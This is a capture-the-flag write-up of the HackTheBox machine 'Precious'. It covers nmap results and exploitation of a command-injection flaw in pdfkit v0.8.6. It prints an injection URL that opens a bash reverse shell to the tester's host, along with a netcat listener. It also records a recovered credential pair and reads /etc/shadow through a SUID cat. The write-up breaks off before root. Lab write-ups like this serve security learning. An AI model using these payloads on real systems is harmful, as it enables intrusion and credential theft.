# Precius

### Nmap:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp   open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://precious.htb/
9000/tcp open  cslistener?
```

### precius.htb

After investigating the web, we discober the possibility to upload html files from our local http server to the remote machine and receive the pdf.

To upload a  html file: `-m http.server 8888` and create a web.html example in that folder.

Part of the esponse to the Post request:

```
<rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
   </rdf:Seq>
  </dc:creator>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

The file is created with pdfkit v0.8.6

Searching on google we find this web with a vulnerability:

{% embed url="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" %}

So we try with the same command `sleep 5`

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

And after 5 seconds, we obtain the prompt with the PDF :clap:

So we try the same with a reverse shell:

On our machine `nc -lnvp 4444`

On the web(using a bash reverse shell):

```bash
http://10.10.16.81:8888/?name={'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.16.81/4444 <&1'`'}
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Now we are on the system as ruby.

In the .bundle folder, there is a file config with the henry's credentials `henry:Q3c1AqGHtoI0aXAYFH`

Testing SUID with `find / -perm -4000 2> /dev/null` there are several options. One is cat, so lets try read the /etc/shadow. Works!

Lets try to read /root/root.txt



